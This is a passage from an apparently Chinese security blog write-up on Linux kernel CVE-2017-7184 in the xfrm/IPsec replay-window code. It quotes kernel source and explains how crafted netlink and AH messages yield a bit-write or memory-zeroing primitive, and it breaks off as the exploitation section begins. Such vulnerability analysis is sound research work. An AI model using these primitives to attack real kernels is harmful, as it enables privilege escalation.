class=\"keyword\">if</span> (x-&gt;km.state == XFRM_STATE_ACQ)</span><br><span class=\"line\">XFRM_INC_STATS(net, LINUX_MIB_XFRMACQUIREERROR);</span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">XFRM_INC_STATS(net,</span><br><span class=\"line\"> LINUX_MIB_XFRMINSTATEINVALID);</span><br><span class=\"line\"><span class=\"keyword\">goto</span> drop_unlock;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> ((x-&gt;encap ? x-&gt;encap-&gt;encap_type : <span class=\"number\">0</span>) != encap_type) {</span><br><span class=\"line\">XFRM_INC_STATS(net, LINUX_MIB_XFRMINSTATEMISMATCH);</span><br><span class=\"line\"><span class=\"keyword\">goto</span> drop_unlock;</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">//x-&gt;repl 在 xfrm_init_replay赋值，可调用xfrm_replay_check_esn</span></span><br><span class=\"line\">[<span class=\"number\">2</span>]<span class=\"keyword\">if</span> (x-&gt;repl-&gt;check(x, skb, seq)) {</span><br><span class=\"line\">XFRM_INC_STATS(net, LINUX_MIB_XFRMINSTATESEQERROR);</span><br><span class=\"line\"><span class=\"keyword\">goto</span> drop_unlock;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (xfrm_state_check_expire(x)) {<span class=\"comment\">//check x-&gt;lft内容</span></span><br><span class=\"line\">XFRM_INC_STATS(net, LINUX_MIB_XFRMINSTATEEXPIRED);</span><br><span class=\"line\"><span class=\"keyword\">goto</span> drop_unlock;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\">spin_unlock(&amp;x-&gt;lock);</span><br><span class=\"line\"><span class=\"comment\">//检查tunnel参数</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (xfrm_tunnel_check(skb, x, family)) {</span><br><span class=\"line\">XFRM_INC_STATS(net, LINUX_MIB_XFRMINSTATEMODEERROR);</span><br><span class=\"line\"><span class=\"keyword\">goto</span> drop;</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">//根据x-&gt;replay_esn中，seq、replay_windows关系，返回seqhi </span></span><br><span class=\"line\">seq_hi = htonl(xfrm_replay_seqhi(x, seq));</span><br><span class=\"line\"></span><br><span class=\"line\">XFRM_SKB_CB(skb)-&gt;seq.input.low = seq;</span><br><span class=\"line\">XFRM_SKB_CB(skb)-&gt;seq.input.hi = seq_hi;</span><br><span class=\"line\"></span><br><span class=\"line\">skb_dst_force(skb);</span><br><span class=\"line\">dev_hold(skb-&gt;dev);</span><br><span class=\"line\"></span><br><span class=\"line\">nexthdr = x-&gt;type-&gt;input(x, skb);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (nexthdr == -EINPROGRESS)</span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">resume:</span><br><span class=\"line\">dev_put(skb-&gt;dev);</span><br><span class=\"line\"></span><br><span class=\"line\">spin_lock(&amp;x-&gt;lock);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (nexthdr &lt;= <span class=\"number\">0</span>) {</span><br><span class=\"line\"><span class=\"keyword\">if</span> (nexthdr == -EBADMSG) {</span><br><span class=\"line\">xfrm_audit_state_icvfail(x, skb,</span><br><span class=\"line\"> x-&gt;type-&gt;proto);</span><br><span class=\"line\">x-&gt;stats.integrity_failed++;</span><br><span class=\"line\">}</span><br><span class=\"line\">XFRM_INC_STATS(net, LINUX_MIB_XFRMINSTATEPROTOERROR);</span><br><span class=\"line\"><span class=\"keyword\">goto</span> drop_unlock;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* only the first xfrm gets the encap type */</span></span><br><span class=\"line\">encap_type = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"comment\">// async = 0 并调用xfrm_replay_recheck_esn</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (async &amp;&amp; x-&gt;repl-&gt;recheck(x, skb, seq)) {</span><br><span class=\"line\">XFRM_INC_STATS(net, LINUX_MIB_XFRMINSTATESEQERROR);</span><br><span class=\"line\"><span class=\"keyword\">goto</span> drop_unlock;</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">//调用xfrm_replay_advance_esn</span></span><br><span class=\"line\">[<span class=\"number\">3</span>]x-&gt;repl-&gt;advance(x, seq);</span><br><span class=\"line\"></span><br><span class=\"line\">x-&gt;curlft.bytes += skb-&gt;len;</span><br><span class=\"line\">x-&gt;curlft.packets++;</span><br><span class=\"line\"></span><br><span class=\"line\">spin_unlock(&amp;x-&gt;lock);</span><br><span class=\"line\"></span><br><span class=\"line\">XFRM_MODE_SKB_CB(skb)-&gt;protocol = nexthdr;</span><br><span class=\"line\"></span><br><span class=\"line\">inner_mode = x-&gt;inner_mode;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (x-&gt;sel.family == AF_UNSPEC) {</span><br><span class=\"line\">inner_mode = xfrm_ip2inner_mode(x, XFRM_MODE_SKB_CB(skb)-&gt;protocol);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (inner_mode == <span class=\"literal\">NULL</span>) {</span><br><span class=\"line\">XFRM_INC_STATS(net, LINUX_MIB_XFRMINSTATEMODEERROR);</span><br><span class=\"line\"><span class=\"keyword\">goto</span> drop;</span><br><span class=\"line\">}</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (inner_mode-&gt;input(x, skb)) {</span><br><span class=\"line\">XFRM_INC_STATS(net, LINUX_MIB_XFRMINSTATEMODEERROR);</span><br><span class=\"line\"><span class=\"keyword\">goto</span> drop;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (x-&gt;outer_mode-&gt;flags &amp; XFRM_MODE_FLAG_TUNNEL) {</span><br><span class=\"line\">decaps = <span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"keyword\">break</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\"> * We need the inner address. However, we only get here for</span></span><br><span class=\"line\"><span class=\"comment\"> * transport mode so the outer address is identical.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\">daddr = &amp;x-&gt;id.daddr;</span><br><span class=\"line\">family = x-&gt;outer_mode-&gt;afinfo-&gt;family;</span><br><span class=\"line\"></span><br><span class=\"line\">err = xfrm_parse_spi(skb, nexthdr, &amp;spi, &amp;seq);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (err &lt; <span class=\"number\">0</span>) {</span><br><span class=\"line\">XFRM_INC_STATS(net, LINUX_MIB_XFRMINHDRERROR);</span><br><span class=\"line\"><span class=\"keyword\">goto</span> drop;</span><br><span class=\"line\">}</span><br><span class=\"line\">} <span class=\"keyword\">while</span> (!err);</span><br><span class=\"line\"></span><br><span class=\"line\">err = xfrm_rcv_cb(skb, family, x-&gt;type-&gt;proto, <span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (err)</span><br><span class=\"line\"><span class=\"keyword\">goto</span> drop;</span><br><span class=\"line\"></span><br><span class=\"line\">nf_reset(skb);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (decaps) {</span><br><span class=\"line\">skb_dst_drop(skb);</span><br><span class=\"line\">netif_rx(skb);</span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">} <span class=\"keyword\">else</span> {</span><br><span class=\"line\"><span class=\"keyword\">return</span> x-&gt;inner_mode-&gt;afinfo-&gt;transport_finish(skb, async);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\">drop_unlock:</span><br><span class=\"line\">spin_unlock(&amp;x-&gt;lock);</span><br><span class=\"line\">drop:</span><br><span class=\"line\">xfrm_rcv_cb(skb, family, x &amp;&amp; x-&gt;type ? x-&gt;type-&gt;proto : nexthdr, <span class=\"number\">-1</span>);</span><br><span class=\"line\">kfree_skb(skb);</span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">}</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td>\n   </tr>\n  </table>\n </figure>\n <p>在<a href=\"https://elixir.bootlin.com/linux/v4.10.6/source/net/xfrm/xfrm_replay.c#L434\" target=\"_blank\" rel=\"noopener\">xfrm_replay_check_esn</a>函数中，首先找到的还是<code>x-&gt;replay_esn</code>成员，接着检查[1]处某<code>bit</code>是否为1，否则退出。首先可以分析出该<code>bit</code>的计算方法，是<code>nr&gt;&gt;5</code>，即<code>(nr / 32)</code>，而<code>bitnr = nr % 32</code>，而<code>bmp</code>的类型为<code>u32</code>，即<code>bmp[i]</code>的大小为<code>4*8 bit</code>，不难发现，<code>bmp</code>的作用就是表示某个值是否被占用。取一个情况<code>bitnr = (pos - diff) % replay_esn-&gt;replay_window</code>，其中<code>pos = (replay_esn-&gt;seq - 1) % replay_esn-&gt;replay_window</code>，<code>diff = top - seq =replay_esn-&gt;seq - seq</code>，因此<code>bitnr = (seq - 1 )% replay_esn-&gt;replay_window</code>，即<code>AH</code>中的<code>seq</code>是否被处理过。</p>\n <figure class=\"highlight plain\">\n  <table>\n   <tr>\n    <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td>\n    <td class=\"code\"><pre><span class=\"line\">static int xfrm_replay_check_esn(struct xfrm_state *x,</span><br><span class=\"line\"> struct sk_buff *skb, __be32 net_seq)</span><br><span class=\"line\">{</span><br><span class=\"line\">unsigned int bitnr, nr;</span><br><span class=\"line\">u32 diff;</span><br><span class=\"line\">struct xfrm_replay_state_esn *replay_esn = x-&gt;replay_esn;</span><br><span class=\"line\">u32 pos;</span><br><span class=\"line\">u32 seq = ntohl(net_seq);</span><br><span class=\"line\">u32 wsize = replay_esn-&gt;replay_window;</span><br><span class=\"line\">u32 top = replay_esn-&gt;seq;</span><br><span class=\"line\">u32 bottom = top - wsize + 1;</span><br><span class=\"line\"></span><br><span class=\"line\">if (!wsize)</span><br><span class=\"line\">return 0;</span><br><span class=\"line\"></span><br><span class=\"line\">if (unlikely(seq == 0 &amp;&amp; replay_esn-&gt;seq_hi == 0 &amp;&amp;</span><br><span class=\"line\"> (replay_esn-&gt;seq &lt; replay_esn-&gt;replay_window - 1)))</span><br><span class=\"line\">goto err;</span><br><span class=\"line\"></span><br><span class=\"line\">diff = top - seq;</span><br><span class=\"line\"></span><br><span class=\"line\">if (likely(top &gt;= wsize - 1)) {</span><br><span class=\"line\">/* A. same subspace */</span><br><span class=\"line\">if (likely(seq &gt; top) || seq &lt; bottom)</span><br><span class=\"line\">return 0;</span><br><span class=\"line\">} else {</span><br><span class=\"line\">/* B. window spans two subspaces */</span><br><span class=\"line\">if (likely(seq &gt; top &amp;&amp; seq &lt; bottom))</span><br><span class=\"line\">return 0;</span><br><span class=\"line\">if (seq &gt;= bottom)</span><br><span class=\"line\">diff = ~seq + top + 1;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\">if (diff &gt;= replay_esn-&gt;replay_window) {</span><br><span class=\"line\">x-&gt;stats.replay_window++;</span><br><span class=\"line\">goto err;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\">pos = (replay_esn-&gt;seq - 1) % replay_esn-&gt;replay_window;</span><br><span class=\"line\"></span><br><span class=\"line\">if (pos &gt;= diff)</span><br><span class=\"line\">bitnr = (pos - diff) % replay_esn-&gt;replay_window;</span><br><span class=\"line\">else</span><br><span class=\"line\">bitnr = replay_esn-&gt;replay_window - (diff - pos);</span><br><span class=\"line\"></span><br><span class=\"line\">nr = bitnr &gt;&gt; 5;</span><br><span class=\"line\">bitnr = bitnr &amp; 0x1F;</span><br><span class=\"line\">[1]if (replay_esn-&gt;bmp[nr] &amp; (1U &lt;&lt; bitnr))</span><br><span class=\"line\">goto err_replay;</span><br><span class=\"line\"></span><br><span class=\"line\">return 0;</span><br><span class=\"line\"></span><br><span class=\"line\">err_replay:</span><br><span class=\"line\">x-&gt;stats.replay++;</span><br><span class=\"line\">err:</span><br><span class=\"line\">xfrm_audit_state_replay(x, skb, net_seq);</span><br><span class=\"line\">return -EINVAL;</span><br><span class=\"line\">}</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td>\n   </tr>\n  </table>\n </figure>\n <p>而在<a href=\"https://elixir.bootlin.com/linux/v4.10.6/source/net/xfrm/xfrm_replay.c#L505\" target=\"_blank\" rel=\"noopener\">xfrm_replay_advance_esn</a>函数中，共有三处对<code>bmp</code>的写操作，其中在[1]处对于某一个<code>bit</code>执行<code>&amp;0</code>，将导致某一个<code>bit</code>被置零。在[2]处，可以发现函数对从<code>bmp[0]</code>到<code>bmp[(replay_esn-&gt;replay_window - 1) &gt;&gt; 5]</code>块内存均置零，而[3]处，这可以对某一个<code>bit</code>写1。</p>\n <figure class=\"highlight plain\">\n  <table>\n   <tr>\n    <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td>\n    <td class=\"code\"><pre><span class=\"line\">static void xfrm_replay_advance_esn(struct xfrm_state *x, __be32 net_seq)</span><br><span class=\"line\">{</span><br><span class=\"line\">unsigned int bitnr, nr, i;</span><br><span class=\"line\">int wrap;</span><br><span class=\"line\">u32 diff, pos, seq, seq_hi;</span><br><span class=\"line\">struct xfrm_replay_state_esn *replay_esn = x-&gt;replay_esn;</span><br><span class=\"line\"></span><br><span class=\"line\">if (!replay_esn-&gt;replay_window)</span><br><span class=\"line\">return;</span><br><span class=\"line\"></span><br><span class=\"line\">seq = ntohl(net_seq);</span><br><span class=\"line\">pos = (replay_esn-&gt;seq - 1) % replay_esn-&gt;replay_window;</span><br><span class=\"line\">seq_hi = xfrm_replay_seqhi(x, net_seq);</span><br><span class=\"line\">wrap = seq_hi - replay_esn-&gt;seq_hi;</span><br><span class=\"line\"></span><br><span class=\"line\">if ((!wrap &amp;&amp; seq &gt; replay_esn-&gt;seq) || wrap &gt; 0) {</span><br><span class=\"line\">if (likely(!wrap))</span><br><span class=\"line\">diff = seq - replay_esn-&gt;seq;</span><br><span class=\"line\">else</span><br><span class=\"line\">diff = ~replay_esn-&gt;seq + seq + 1;</span><br><span class=\"line\"></span><br><span class=\"line\">if (diff &lt; replay_esn-&gt;replay_window) {</span><br><span class=\"line\">for (i = 1; i &lt; diff; i++) {</span><br><span class=\"line\">bitnr = (pos + i) % replay_esn-&gt;replay_window;</span><br><span class=\"line\">nr = bitnr &gt;&gt; 5;</span><br><span class=\"line\">bitnr = bitnr &amp; 0x1F;</span><br><span class=\"line\">[1]replay_esn-&gt;bmp[nr] &amp;= ~(1U &lt;&lt; bitnr);</span><br><span class=\"line\">}</span><br><span class=\"line\">} else {</span><br><span class=\"line\">nr = (replay_esn-&gt;replay_window - 1) &gt;&gt; 5;</span><br><span class=\"line\">for (i = 0; i &lt;= nr; i++)</span><br><span class=\"line\">[2]replay_esn-&gt;bmp[i] = 0;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\">bitnr = (pos + diff) % replay_esn-&gt;replay_window;</span><br><span class=\"line\">replay_esn-&gt;seq = seq;</span><br><span class=\"line\"></span><br><span class=\"line\">if (unlikely(wrap &gt; 0))</span><br><span class=\"line\">replay_esn-&gt;seq_hi++;</span><br><span class=\"line\">} else {</span><br><span class=\"line\">diff = replay_esn-&gt;seq - seq;</span><br><span class=\"line\"></span><br><span class=\"line\">if (pos &gt;= diff)</span><br><span class=\"line\">bitnr = (pos - diff) % replay_esn-&gt;replay_window;</span><br><span class=\"line\">else</span><br><span class=\"line\">bitnr = replay_esn-&gt;replay_window - (diff - pos);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\">nr = bitnr &gt;&gt; 5;</span><br><span class=\"line\">bitnr = bitnr &amp; 0x1F;</span><br><span class=\"line\">[3]replay_esn-&gt;bmp[nr] |= (1U &lt;&lt; bitnr);</span><br><span class=\"line\"></span><br><span class=\"line\">if (xfrm_aevent_is_on(xs_net(x)))</span><br><span class=\"line\">x-&gt;repl-&gt;notify(x, XFRM_REPLAY_UPDATE);</span><br><span class=\"line\">}</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td>\n   </tr>\n  </table>\n </figure>\n <p>因此，<strong>通过用户态空间发送一个<code>AH</code>数据包将导致，一个<code>bit</code>的内存写，或者一段空间的置零</strong>。</p>\n <h1 id=\"漏洞触发与利用\"><a href=\"http://p4nda.top/2019/02/16/CVE-2017-7184/#漏洞触发与利用\" class=\"headerlink\" title=\"漏洞触发与利用\"></a>漏洞触发与利用</h1>\n <h2 id=\"netlink套接字通信\"><a href=\"http://p4nda.top/2019/02/16/CVE-2017-7184/#netlink套接字通信\" class=\"headerlink\" title=\"netlink套接字通信\"></a>netlink套接字通信</h2>\n <p>与熟悉的驱动或内核模块所使用的系统调用或<code>ioctl</code>机制不同，本漏洞触发使用过的是<code>netlink</code>通信机制。</p>\n <blockquote>\n  <p>Netlink 是一种特殊的 socket，它是 Linux 所特有的，类似于 BSD 中的AF_ROUTE 但又远比它的功能强大。目前在Linux 内核中使用netlink 进行应用与内核通信的应用很多; 包括：路由 daemon（NETLINK_ROUTE），用户态 socket 协议（NETLINK_USERSOCK），防火墙（NETLINK_FIREWALL），netfilter 子系统（NETLINK_NETFILTER），内核事件向用户态通知（NETLINK_KOBJECT_UEVENT）， 通用 netlink（NETLINK_GENERIC）等。</p>\n </blockquote>\n <p>而基于<code>netlink</code>的内核通信与<code>socket</code>的通信方式一致，都是通过<code>sendto()，recvfrom()； sendmsg(), recvmsg()</code>的用户态<code>API</code>。</p>\n <p>而发送到内核态的数据以协议包的形式进行解析，因此需要了解<code>xfrm</code>数据包的协议格式，其协议结构图及相关函数图示如下。</p>\n <figure class=\"highlight c\">\n  <table>\n   <tr>\n    <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td>\n    <td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* ========================================================================</span></span><br><span class=\"line\"><span class=\"comment\"> *         Netlink Messages and Attributes Interface (As Seen On TV)</span></span><br><span class=\"line\"><span class=\"comment\"> * ------------------------------------------------------------------------</span></span><br><span class=\"line\"><span class=\"comment\"> *                          Messages Interface</span></span><br><span class=\"line\"><span class=\"comment\"> * ------------------------------------------------------------------------</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * Message Format:</span></span><br><span class=\"line\"><span class=\"comment\"> * &lt;--- nlmsg_total_size(payload) ---&gt;</span></span><br><span class=\"line\"><span class=\"comment\"> * &lt;-- nlmsg_msg_size(payload) -&gt;</span></span><br><span class=\"line\"><span class=\"comment\"> * +----------+- - -+-------------+- - -+-------- - -</span></span><br><span class=\"line\"><span class=\"comment\"> * | nlmsghdr | Pad | Payload | Pad | nlmsghdr</span></span><br><span class=\"line\"><span class=\"comment\"> * +----------+- - -+-------------+- - -+-------- - -</span></span><br><span class=\"line\"><span class=\"comment\"> * nlmsg_data(nlh)---^ ^</span></span><br><span class=\"line\"><span class=\"comment\"> * nlmsg_next(nlh)-----------------------+</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * Payload Format:</span></span><br><span class=\"line\"><span class=\"comment\"> * &lt;---------------------- nlmsg_len(nlh) ---------------------&gt;</span></span><br><span class=\"line\"><span class=\"comment\"> * &lt;------ hdrlen ------&gt; &lt;- nlmsg_attrlen(nlh, hdrlen) -&gt;</span></span><br><span class=\"line\"><span class=\"comment\"> * +----------------------+- - -+--------------------------------+</span></span><br><span class=\"line\"><span class=\"comment\"> * | Family Header | Pad | Attributes |</span></span><br><span class=\"line\"><span class=\"comment\"> * +----------------------+- - -+--------------------------------+</span></span><br><span class=\"line\"><span class=\"comment\"> * nlmsg_attrdata(nlh, hdrlen)---^</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * Data Structures:</span></span><br><span class=\"line\"><span class=\"comment\"> * struct nlmsghdrnetlink message header</span></span><br><span class=\"line\"><span class=\"comment\"> * ------------------------------------------------------------------------</span></span><br><span class=\"line\"><span class=\"comment\"> * Attributes Interface</span></span><br><span class=\"line\"><span class=\"comment\"> * ------------------------------------------------------------------------</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * Attribute Format:</span></span><br><span class=\"line\"><span class=\"comment\"> * &lt;------- nla_total_size(payload) -------&gt;</span></span><br><span class=\"line\"><span class=\"comment\"> * &lt;---- nla_attr_size(payload) -----&gt;</span></span><br><span class=\"line\"><span class=\"comment\"> * +----------+- - -+- - - - - - - - - +- - -+-------- - -</span></span><br><span class=\"line\"><span class=\"comment\"> * | Header | Pad | Payload | Pad | Header</span></span><br><span class=\"line\"><span class=\"comment\"> * +----------+- - -+- - - - - - - - - +- - -+-------- - -</span></span><br><span class=\"line\"><span class=\"comment\"> * &lt;- nla_len(nla) -&gt; ^</span></span><br><span class=\"line\"><span class=\"comment\"> * nla_data(nla)----^ |</span></span><br><span class=\"line\"><span class=\"comment\"> * nla_next(nla)-----------------------------'</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * Data Structures:</span></span><br><span class=\"line\"><span class=\"comment\"> * struct nlattrnetlink attribute header</span></span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td>\n   </tr>\n  </table>\n </figure>\n <p>从上图可以看出，<strong>发送到内核的数据需要如下形式<code>nlmsghdr</code> + <code>Family Header</code> + <code>n * (nla + data)</code>。</strong></p>\n <p>首先从<code>xfrm_netlink_rcv</code>函数中调用<a href=\"https://elixir.bootlin.com/linux/v4.10.6/source/net/netlink/af_netlink.c#L2275\" target=\"_blank\" rel=\"noopener\">netlink_rcv_skb</a>函数，会检查<code>nlmsg_type</code>及<code>nlmsg_len</code>范围，并交由<code>cb</code>函数处理，其赋值为<code>xfrm_user_rcv_msg</code>。</p>\n <figure class=\"highlight c\">\n  <table>\n   <tr>\n    <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td>\n    <td class=\"code\"><pre><span class=\"line\"><span 